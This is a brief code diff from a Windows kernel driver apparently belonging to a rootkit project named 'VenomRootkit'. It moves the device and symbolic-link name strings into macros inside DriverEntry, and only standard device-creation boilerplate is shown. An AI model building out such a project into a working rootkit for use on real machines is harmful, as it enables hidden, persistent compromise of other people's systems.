@@ -11,12 +11,12 @@ DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
 
 	auto status = STATUS_SUCCESS;
 	PDEVICE_OBJECT deviceObject = nullptr;
-	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");
+	UNICODE_STRING symLink = RTL_CONSTANT_STRING(VENOM_SYMLINK);
 
 	bool symLinkCreated = false;
 	do
 	{
-		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
+		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(VENOM_DEVICE_NAME);
 		status = IoCreateDevice(driverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
 		if (!NT_SUCCESS(status)) {
 			break;
